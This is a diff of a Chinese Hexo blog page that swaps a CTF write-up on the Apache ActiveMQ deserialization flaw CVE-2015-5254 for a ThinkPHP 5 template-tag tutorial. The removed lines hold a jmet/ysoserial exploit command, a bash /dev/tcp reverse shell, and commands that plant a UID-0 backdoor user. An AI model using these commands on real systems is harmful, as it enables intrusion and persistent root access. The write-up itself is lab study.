@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    CVE-2015-5254 |  
+    ThinkPhp-5 |  
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -56,7 +56,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-CVE-2015-5254"
+  id="post-ThinkPhp-5"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -67,18 +67,18 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  CVE-2015-5254
+  ThinkPhp-5
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2020/09/22/CVE-2015-5254/" class="article-date">
-  <time datetime="2020-09-22T13:40:51.000Z" itemprop="datePublished">2020-09-22</time>
+      <a href="/2020/09/23/ThinkPhp-5/" class="article-date">
+  <time datetime="2020-09-23T12:49:09.000Z" itemprop="datePublished">2020-09-23</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/CTF/">CTF</a> / <a class="article-category-link" href="/categories/CTF/CVE/">CVE</a>
+    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a>
   </div>
   
 <div class="word_count">
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">669</span>
+            <span class="post-count">898</span>
         </span>
     </span>
 
@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">3 min</span>
+            <span class="post-count">4 min</span>
         </span>
     </span>
 </div>
@@ -110,40 +110,52 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="lt-ActiveMQ-反序列化漏洞-gt-待完全理解"><a href="#lt-ActiveMQ-反序列化漏洞-gt-待完全理解" class="headerlink" title="&lt;ActiveMQ 反序列化漏洞&gt;(待完全理解)"></a>&lt;ActiveMQ 反序列化漏洞&gt;(待完全理解)</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
-<!--morer-->
+  <h1 id="ThinkPhp-5"><a href="#ThinkPhp-5" class="headerlink" title="ThinkPhp-5"></a>ThinkPhp-5</h1><h2 id="模版的条件判断标签"><a href="#模版的条件判断标签" class="headerlink" title="模版的条件判断标签"></a>模版的条件判断标签</h2><h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;switch number&#125; </span><br><span class="line">&#123;case 1&#125;1&#123;&#x2F;case&#125;</span><br><span class="line">&#123;case 5&#125;5&#123;&#x2F;case&#125;</span><br><span class="line">&#123;case 10&#125;10&#123;&#x2F;case&#125; </span><br><span class="line">&#123;default&#x2F;&#125;不存在 &#123;&#x2F;switch&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞利用过程如下：</p>
-<ol>
-<li>构造（可以使用ysoserial）可执行命令的序列化对象</li>
-<li>作为一个消息，发送给目标61616端口</li>
-<li>访问web管理页面，读取消息，触发漏洞</li>
-</ol>
-<p>使用<a target="_blank" rel="noopener" href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p>
-<p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure>
+<h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;if ($number &gt; 10) and ($number &lt; 20)&#125;</span><br><span class="line">    6666</span><br><span class="line">&#123;else if $number &#x3D;&#x3D; 10&#125;</span><br><span class="line">    8888</span><br><span class="line">&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>
 
-<p>然后登陆页面</p>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event">http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event</a></p>
-<p>点击消息，触发漏洞</p>
-<p>然后进入docker</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it   9a540c50a8dc  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
 
-<p>如果在/tmp目录下存在success文件则显示成功</p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;12340&gt;&amp;1&quot; -Yp ROME 127.0.0.1   61616</span><br></pre></td></tr></table></figure>
+<h3 id="present-和-notpresent-判断变量是否已经定义赋值-是否存在-；"><a href="#present-和-notpresent-判断变量是否已经定义赋值-是否存在-；" class="headerlink" title="{present}和{notpresent}判断变量是否已经定义赋值(是否存在)；"></a>{present}和{notpresent}判断变量是否已经定义赋值(是否存在)；</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;present name&#x3D;&#39;user&#39;&#125;</span><br><span class="line">存在</span><br><span class="line">&#123;&#x2F;present&#125;</span><br><span class="line">&#123;present name&#x3D;&#39;user&#39;&#125; </span><br><span class="line">user已存在 </span><br><span class="line">&#123;else&#x2F;&#125; </span><br><span class="line">user不存在 </span><br><span class="line">&#123;&#x2F;present</span><br></pre></td></tr></table></figure>
 
-<p>外面用nc监听1234端口</p>
-<h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -g root -s &#x2F;bin&#x2F;bash -u 10010 test</span><br></pre></td></tr></table></figure>
+<h3 id="empty-和-notempty-判断变量是否为空值"><a href="#empty-和-notempty-判断变量是否为空值" class="headerlink" title="{empty}和{notempty}判断变量是否为空值"></a>{empty}和{notempty}判断变量是否为空值</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;empty name&#x3D;&#39;username&#39;&#125;</span><br><span class="line">有值</span><br><span class="line">&#123;&#x2F;empty&#125;</span><br><span class="line">&#123;empty name&#x3D;&#39;username&#39;&#125; </span><br><span class="line">username 有值</span><br><span class="line">&#123;else&#x2F;&#125;</span><br><span class="line">username 没值 </span><br><span class="line">&#123;&#x2F;empty&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &quot;s&#x2F;test:x:10010&#x2F;test:x:0&#x2F;g&quot; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;defined name&#x3D;&#39;PI&#39;&#125;</span><br><span class="line">PI存在 </span><br><span class="line">&#123;else&#x2F;&#125;</span><br><span class="line">PI不存在 </span><br><span class="line">&#123;&#x2F;defined&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test:sd123456&quot; | chpasswd</span><br></pre></td></tr></table></figure>
+<h2 id="模版的加载包含输出"><a href="#模版的加载包含输出" class="headerlink" title="模版的加载包含输出"></a>模版的加载包含输出</h2><h3 id="包含文件"><a href="#包含文件" class="headerlink" title="包含文件"></a>包含文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;include file&#x3D;&#39;public&#x2F;header&#39; title&#x3D;&#39;$title&#39; keywords&#x3D;&#39;模版&#39;&#x2F;&#125;</span><br><span class="line">主体</span><br><span class="line">&#123;include file&#x3D;&#39;..&#x2F;application&#x2F;view&#x2F;public&#x2F;footer.html&#39;&#125;</span><br></pre></td></tr></table></figure>
 
-<p>到这里就可以完全创建一个具有root权限的用户，稍后进行远程登陆就可以了。</p>
-<h2 id="jmet的使用"><a href="#jmet的使用" class="headerlink" title="jmet的使用"></a>jmet的使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar target&#x2F;jmet-0.1.0-all.jar</span><br><span class="line">ERROR d.c.j.JMET [main] Misconfiguration: Missing required options: [-C Custom script exploitation mode, -Y Deser exploitation mode, -X XXE exploitation mode], [-T topic name, -Q queue name], I</span><br><span class="line">usage: jmet [host] [port]</span><br><span class="line"> -C,--Custom &lt;scriptname&gt;         Custom script exploitation mode</span><br><span class="line"> -f,--filter &lt;scriptname&gt;         filter script</span><br><span class="line"> -I,--impl &lt;arg&gt;                  ActiveMQ| Artemis| WebSphereMQ| Qpid10|</span><br><span class="line">                                  Qpid09| HornetQ| SwiftMQ| RabbitMQ|</span><br><span class="line">                                  OpenMQ</span><br><span class="line"> -pw,--password &lt;pass&gt;            password for authentication</span><br><span class="line"> -Q,--Queue &lt;name&gt;                queue name</span><br><span class="line"> -s,--substitute                  Substituation mode: Use §§ to pass</span><br><span class="line">                                  ysoserial payload name to CMD</span><br><span class="line"> -T,--Topic &lt;name&gt;                topic name</span><br><span class="line"> -u,--user &lt;id&gt;                   user for authentication</span><br><span class="line"> -v,--verbose                     Running verbose mode</span><br><span class="line"> -X,--XXE &lt;URL&gt;                   XXE exploitation mode</span><br><span class="line"> -Xp,--xxepayload &lt;payloadname&gt;   Optional: XXE Payload to use EXTERNAL|</span><br><span class="line">                                  PARAMATER| DTD</span><br><span class="line"> -Y,--ysoserial &lt;CMD&gt;             Deser exploitation mode</span><br><span class="line"> -Yp,--payload &lt;payloadname&gt;      Optional: Ysoserial Payload to use</span><br><span class="line">                                  BeanShell1| CommonsBeanutils1|</span><br><span class="line">                                  CommonsCollections1|</span><br><span class="line">                                  CommonsCollections2|</span><br><span class="line">                                  CommonsCollections3|</span><br><span class="line">                                  CommonsCollections4|</span><br><span class="line">                                  CommonsCollections5| Groovy1|</span><br><span class="line">                                  Hibernate1| Hibernate2| Jdk7u21| JSON1|</span><br><span class="line">                                  ROME| Spring1| Spring2</span><br><span class="line"> -Zc,--channel &lt;channel&gt;          channel name (only WebSphereMQ)</span><br><span class="line"> -Zq,--queuemanager &lt;name&gt;        queue manager name (only WebSphereMQ)</span><br><span class="line"> -Zv,--vhost &lt;name&gt;               vhost name (only AMQP-Brokers:</span><br><span class="line">                                  RabbitMQ|QPid09|QPid10)</span><br></pre></td></tr></table></figure>
+<p>header.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;[title]&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;头部&lt;br&gt;</span><br></pre></td></tr></table></figure>
 
-<p>其中的深层次的原理等待java+web学完之后回来补</p>
+<p>footer</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;br&gt;尾部&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="输出替换"><a href="#输出替换" class="headerlink" title="输出替换"></a>输出替换</h3><p>运用于调用静态文件，将路径打包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在目前二级目录下，template.php 中，配置新增一个参数；</span><br><span class="line">&#39;tpl_replace_string&#39; &#x3D;&gt; [ &#39;__JS__&#39; &#x3D;&gt; &#39;static&#x2F;js&#39;, &#39;__CSS__&#39; &#x3D;&gt; &#39;static&#x2F;css&#39;, ]</span><br></pre></td></tr></table></figure>
+
+<p>如果是在顶级域名下，直接在改成/static/css 即可，加一个反斜杠； </p>
+<p>html 文件调用端，直接通过<code>__CSS__(__JS__)</code>配置的魔术方法调用即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;__CSS__&#x2F;basic.css&quot;&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;__JS__&#x2F;basic.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="模版的布局和继承"><a href="#模版的布局和继承" class="headerlink" title="模版的布局和继承"></a>模版的布局和继承</h2><h3 id="模版的布局"><a href="#模版的布局" class="headerlink" title="模版的布局"></a>模版的布局</h3><p>开启布局功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">template.php</span><br><span class="line">&#39;layout_on&#39; &#x3D;&gt; true,</span><br><span class="line">&#x2F;&#x2F; 改变模版位置</span><br><span class="line">  &#39;layout_name&#39; &#x3D;&gt; &#39;public&#x2F;layout&#39;,</span><br><span class="line">  &#x2F;&#x2F;更改__content__</span><br><span class="line">  &#39;layout_item&#39; &#x3D;&gt; &#39;&#123;__REPLACE__&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>然后模版开启</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;include file&#x3D;&#39;public&#x2F;header&#39; title&#x3D;&#39;$title&#39; keywords&#x3D;&#39;模版&#39;&#x2F;&#125;</span><br><span class="line">&#123;__CONTENT__&#125;&#x2F;&#x2F;引入index.html中的内容</span><br><span class="line">&#123;include file&#x3D;&#39;..&#x2F;application&#x2F;view&#x2F;public&#x2F;footer.html&#39;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二种打开模版"><a href="#第二种打开模版" class="headerlink" title="第二种打开模版"></a>第二种打开模版</h3><p>index.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;layout name&#x3D;&quot;public&#x2F;layout&quot; repalce&#x3D;&#39;[__CONTENT__]&#39;&#125;</span><br><span class="line">主体</span><br></pre></td></tr></table></figure>
+
+<h3 id="第三种打开模版"><a href="#第三种打开模版" class="headerlink" title="第三种打开模版"></a>第三种打开模版</h3><p>在C端实现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;view-&gt;engine-&gt;layout(true);&#x2F;&#x2F;如果不使用默认路径还是需要更改配置</span><br></pre></td></tr></table></figure>
+
+<h2 id="模版继承"><a href="#模版继承" class="headerlink" title="模版继承"></a>模版继承</h2><p>首先创建一个类似于父类的东西</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;$title&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;block name=&#x27;nav&#x27;&#125;nav&#123;/block&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;block name=&#x27;footer&#x27;&#125; @ThinkPHP 版权所有 &#123;/block&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意其中有两个block标签，是用来进行占位的</p>
+<p>然后进行调用 <code>&#123;__block__&#125;</code>这是用来引用原来的基类中的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;extend name&#x3D;&#39;public&#x2F;base&#39;&#125;</span><br><span class="line">&#123;extend name&#x3D;&#39;..&#x2F;application&#x2F;view&#x2F;public&#x2F;base.html&#39;&#125;</span><br><span class="line">&#123;block name&#x3D;&#39;nav&#39;&#125;</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;首页&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;分类&lt;&#x2F;li&gt;</span><br><span class="line">    &lt;li&gt;关于&lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ol&gt;</span><br><span class="line">&#123;&#x2F;block&#125;</span><br><span class="line">&#123;block name&#x3D;&#39;footer&#39;&#125;</span><br><span class="line">I LOVE YOU &#123;__block__&#125;</span><br><span class="line">&#123;&#x2F;block&#125;</span><br></pre></td></tr></table></figure>
+
  
       <!-- reward -->
       
@@ -206,12 +218,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/09/22/CVE-2015-5254/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/09/23/ThinkPhp-5/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE%EF%BC%8C%E6%9C%AA%E5%AE%8C%E5%85%A8%E8%A7%A3%E5%86%B3/" rel="tag">CVE，未完全解决</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ThinkPHP/" rel="tag">ThinkPHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li></ul>
 
     </footer>
   </div>
@@ -219,19 +231,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2020/09/23/ThinkPhp-5/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            ThinkPhp-5
-          
-        </div>
-      </a>
     
-    
-      <a href="/2020/09/21/ThinkPhp-4/" class="article-nav-link">
+      <a href="/2020/09/22/CVE-2015-5254/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">ThinkPhp-4</div>
+        <div class="article-nav-title">CVE-2015-5254</div>
       </a>
     
   </nav>
